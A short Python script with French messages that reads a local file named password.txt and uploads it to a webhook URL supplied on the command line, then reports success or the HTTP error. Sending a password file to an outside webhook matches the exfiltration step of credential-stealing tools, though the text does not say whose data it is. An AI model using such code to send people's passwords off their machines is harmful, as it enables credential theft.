import sys
import requests

FILE_PATH = "password.txt"

WEBHOOK_URL = sys.argv[1]

with open(FILE_PATH, "rb") as file:
    response = requests.post(
        WEBHOOK_URL,
        files={"file": ("passwords.txt", file, "text/plain")}
    )

if response.ok:
    print("Fichier envoyé avec succès.")
else:
    print(f"Échec de l'envoi : HTTP {response.status_code}")
    print(response.text)
